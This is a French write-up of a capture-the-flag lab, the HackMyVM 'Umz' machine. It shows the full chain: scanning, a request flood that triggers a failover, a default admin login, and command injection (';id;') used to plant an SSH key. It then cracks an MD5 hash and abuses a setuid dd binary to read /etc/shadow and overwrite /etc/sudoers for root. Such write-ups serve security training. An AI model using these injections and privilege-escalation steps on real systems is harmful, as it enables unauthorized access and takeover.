---
title: "Solution du CTF Umz de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

Le CTF Umz nous laisse avec un goût un peu fade. Rien de bien intéressant, des objectifs peu clairs...

Au moins il y avait un peu d'originalité.

### En stress

Nmap trouve deux ports ouverts sur la VM, les plus classiques :

```console
sudo  nmap -Pn -p- 192.168.56.110 -T5

Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 192.168.56.110
Host is up (0.000055s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:B3:30:96 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```

La page d'index est bling-bling, mais n'apporte aucun élément intéressant.

Il est toutefois mention de backups donc j'énumère aussi des extensions supplémentaires.

```console
$ feroxbuster -u http://192.168.56.110/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -n -x php,zip,bak,tar.gz,html,7z
                                                                                                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.110/
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, zip, bak, tar.gz, html, 7z]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       76l      307w     3024c http://192.168.56.110/
200      GET       93l      201w     2714c http://192.168.56.110/index.php
200      GET       76l      307w     3024c http://192.168.56.110/index.html
[####################] - 5m   8916733/8916733 0s      found:3       errors:0      
[####################] - 5m   8916733/8916733 31129/s http://192.168.56.110/
```

Il y a deux pages d'index. Ni lien ni formulaire sur celle en PHP donc on a envie de croire qu'elle attend un paramètre, ce que l'on va brute-forcer avec `ffuf` :

```console
ffuf -u "http://192.168.56.110/index.php?FUZZ=1" -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -fs 2714

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.110/index.php?FUZZ=1
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 2714
________________________________________________

stress                  [Status: 200, Size: 2707, Words: 909, Lines: 94, Duration: 1ms]
:: Progress: [119600/119600] :: Job [1/1] :: 1509 req/sec :: Duration: [0:00:55] :: Errors: 0 ::
```

On a trouvé un paramètre `stress` mais en jouant un peu avec, on a l'impression qu'il est plutôt secure. Chose confirmée avec Wapiti et sqlmap qui n'ont rien décelé.

Le paramètre sert en vérité passer un entier qui sert de limite à une boucle pour trouver des nombres premiers. Par exemple si on passe 5 la page indique qu'elle a trouvé 3 nombres premiers (1, 3, 5).

En tête de page on a ce message :

> ⚠️ DDoS Protection Active: This service is protected by automated anti-DDoS measures. Excessive requests will trigger security protocols.

Ça laisse supposer qu'un port sera ouvert par le mécanisme anti DDoS.

Ma première idée était qu'il faille mettre un grand nombre dans le paramètre `stress` pour forcer le script à faire des longs calculs mais j'obtenais seulement une erreur 500 après un laps de temps.

Du coup l'autre idée était de requêter la page en masse. Il semble qu'il faille passer le paramètre `stress` pour que ça fonctionne.

```bash
ffuf -u "http://192.168.56.110/index.php?stress=FUZZ" -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -fs 2714
```

Après ça un port 8080 est apparu et le serveur Apache n'est plus accessible :

```
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

J'ai lancé Wapiti dessus qui a trouvé quelques éléments intéressants :

```bash
wapiti -u http://192.168.56.110:8080/ --color -m all
```

```
[*] Launching module wapp
---
Flask ['1.0.1'] detected
  -> Categories: ['Web frameworks', 'Web servers']
  -> Group(s): ['Web development', 'Servers']
  -> CPE: cpe:2.3:a:palletsprojects:flask:*:*:*:*:*:*:*:*

Python ['3.9.2'] detected
  -> Categories: ['Programming languages']
  -> Group(s): ['Web development']
  -> CPE: cpe:2.3:a:python:python:*:*:*:*:*:*:*:*
[*] Launching module nikto
---
This might be interesting.
http://192.168.56.110:8080/console
References:
  https://vulners.com/osvdb/OSVDB:3092
---
[*] Launching module csrf
---
Lack of anti CSRF token
    POST /login HTTP/1.1
    host: 192.168.56.110:8080
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.56.110:8080/login
    content-length: 24
    Content-Type: application/x-www-form-urlencoded

    user=alice&pass=Letm3in_
---
[*] Launching module buster
Found webpage http://192.168.56.110:8080/admin
```

On a donc une appli Flask avec une mire de login non protégée par un token CSRF.

Toutefois, un simple essai de connexion avec `admin` / `admin` a réussi.

Là, un champ de texte avec le placeholder `Enter IP address` et un bouton `Execute ping` s'offrent à nous.

Je m'empresse de saisir `;id;` et j'obtiens `uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)` : une faille d'exécution de commandes toute simple.

La suite : ajouter une clé SSH autorisée pour cet utilisateur :

```bash
;mkdir /home/welcome/.ssh;echo "ssh-rsa AAAAB3N--- snip ---OjVkzx3" > /home/welcome/.ssh/authorized_keys;
```

### Unstrip

Je peux désormais passer par SSH :

```console
$ ssh -i ~/.ssh/hacker welcome@192.168.56.110
Last login: Fri Apr 11 22:27:59 2025 from 192.168.3.94
welcome@Umz:~$ ls
user.txt
welcome@Umz:~$ cat user.txt 
flag{user-4483f72525b3c316704cf126bec02d5c}
```

Pour une fois la commande autorisée par sudo change des scénarios habituels :

```console
welcome@Umz:~$ sudo -l
Matching Defaults entries for welcome on Umz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Umz:
    (ALL) NOPASSWD: /usr/bin/md5sum
```

On imagine tout de même le scénario rapidement : un password doit se trouver quelque part et on va devoir casser le hash obtenu.

Je ne met pas longtemps avant de trouver le fichier en question :


```console
welcome@Umz:~$ ls /opt/flask-debug/ -al
total 20
drwxr-xr-x 2 welcome welcome 4096 May  3 10:32 .
drwxr-xr-x 3 root    root    4096 May  3 09:46 ..
-rw-r--r-- 1 root    root    5001 May  3 10:23 flask_debug.py
-rwx------ 1 root    root      10 May  3 10:32 umz.pass
```

Je peux donc obtenir son hash MD5 :

```console
welcome@Umz:~$ sudo md5sum /opt/flask-debug/umz.pass
a963fadd7fd379f9bc294ad0ba44f659  /opt/flask-debug/umz.pass
```

Je l'ai soumis à `crackstation.net` sans succès. J'ai ensuite tenté ma chance avec JtR :

```bash
john --format=Raw-MD5 --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt /tmp/hash.txt
```

Nada ! Explication la plus probable : il y a un retour à la ligne après le mot de passe donc le hash est faussé.

Via le listing on sait que le mot de passe + le retour à la ligne font 10 caractères, j'ai donc écrit ce script Python
qui lit les lignes depuis un fichier (sans les stripper) puis calcule le MD5 lorsque l'on a le bon compte de caractères :

```python
import sys
from hashlib import md5

wordlist = sys.argv[1]
with open(wordlist, encoding="utf-8", errors="ignore") as fd:
    for line in fd:
        if len(line) == 10:
            hash_ = md5(line.encode()).hexdigest()
            if hash_ == "a963fadd7fd379f9bc294ad0ba44f659":
                print(f"Found {line}")
                break
```

C'est bon !

```console
$ python brute.py /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
Found sunshine3
```

Le mot de passe ne permet pas de passer root et je découvre qu'il y a un autre utilisateur sur le système :

### Dédé

Cet utilisateur a un binaire setuid root dans son dossier personnel :

```console
welcome@Umz:/opt/flask-debug$ ls /home/
umzyyds  welcome
welcome@Umz:/opt/flask-debug$ su umzyyds
Password: 
umzyyds@Umz:/opt/flask-debug$ cd
umzyyds@Umz:~$ ls -al
total 96
drwx------ 2 umzyyds umzyyds  4096 May  3 10:42 .
drwxr-xr-x 4 root    root     4096 May  3 10:27 ..
lrwxrwxrwx 1 root    root        9 May  3 10:38 .bash_history -> /dev/null
-rw-r--r-- 1 umzyyds umzyyds   220 May  3 10:27 .bash_logout
-rw-r--r-- 1 umzyyds umzyyds  3526 May  3 10:27 .bashrc
-rw-r--r-- 1 umzyyds umzyyds   807 May  3 10:27 .profile
-rwsr-sr-x 1 root    root    76712 May  3 10:42 Dashazi
```

En regardant le contenu du binaire avec `strings` on a du mal à comprendre ce qu'il fait. Il y a beaucoup de chaines et
le binaire n'est pas static, ça ne ressemble pas à un programme custom.

Notre seule solution, c'est l'exécution :

```console
umzyyds@Umz:~$ file Dashazi 
Dashazi: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=21bfd63cfb732f9c09d17921f8eef619429bcd35, stripped
umzyyds@Umz:~$ ./Dashazi 
id
^C0+1 records in
0+0 records out
0 bytes copied, 10.2457 s, 0.0 kB/s
```

Je reconnais l'output qui est celui de la commande `dd` qui sert à copier toute sorte de choses (fichiers, périphériques, etc).

J'ai débord copié `shadow` dans l'idée de casser le mot de passe de `root` :

```console
umzyyds@Umz:~$ ./Dashazi if=/etc/shadow of=shadow
2+1 records in
2+1 records out
1076 bytes (1.1 kB, 1.1 KiB) copied, 0.000167197 s, 6.4 MB/s
umzyyds@Umz:~$ head -1 shadow 
root:$6$ncNrfMmFicrVYnMJ$eRxtK.IK.8vvnkzP8PMhc6HOpXWlSFs4vMyj5yz2qmIgQMAi6Zjv0vTF7YFo07hw1U.QAEGHAZRqeWOA15qcY1:20211:0:99999:7:::
```

Mais après avoir laissé tourner JtR un moment, j'ai abandonné.

J'ai choisis la même approche que sur [Magifi]({% link _posts/2025-05-14-Solution-du-CTF-Magifi-de-HackMyVM.md %}#alohomora), à savoir ajouter une ligné à `sudoers` :

```console
umzyyds@Umz:~$ echo -e "\numzyyds ALL=(ALL) NOPASSWD: /usr/bin/bash" >> sudoers_copy 
umzyyds@Umz:~$ ./Dashazi if=sudoers_copy of=/etc/sudoers
1+1 records in
1+1 records out
755 bytes copied, 0.00908441 s, 83.1 kB/s
umzyyds@Umz:~$ sudo bash
root@Umz:/home/umzyyds# id
uid=0(root) gid=0(root) groups=0(root)
root@Umz:/home/umzyyds# cd /root
root@Umz:~# ls
flask_debug.py  monitor.sh  root.txt
root@Umz:~# cat root.txt 
flag{root-a73c45107081c08dd4560206b8ef8205}
```

Par curiosité voici le script qui surveillait le "stress" sur le script PHP :

```bash
#!/bin/bash
# 文件名：monitor.sh
TARGET_URL="http://localhost/index.php"
CHECK_INTERVAL=3  # 检测间隔3秒
MAX_FAILS=3        # 连续失败3次触发操作
FAIL_COUNT=0

while true; do
    # 检查页面是否包含特征字符串（超时3秒）
    RESPONSE=$(timeout 3 curl -s -w "%{http_code}" "$TARGET_URL")
    STATUS=$?
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    CONTENT=$(echo "$RESPONSE" | head -n-1)

    # 判断条件：HTTP状态码非200或内容不包含特征
    if [[ $STATUS -ne 0 || $HTTP_CODE != 200 || ! "$CONTENT" =~ "HEALTHY_STRING" ]]; then
        FAIL_COUNT=$((FAIL_COUNT + 1))
        echo "[$(date)] 检测到服务异常，失败次数：$FAIL_COUNT" >> /var/log/monitor.log

        if [ $FAIL_COUNT -ge $MAX_FAILS ]; then
            echo "[$(date)] 触发故障转移！关闭Apache，启动Flask服务..." >> /var/log/monitor.log
            systemctl stop apache2
            sudo -u welcome python3 /opt/flask-debug/flask_debug.py
            exit 0
        fi
    else
        FAIL_COUNT=0
    fi

    sleep $CHECK_INTERVAL
done
```
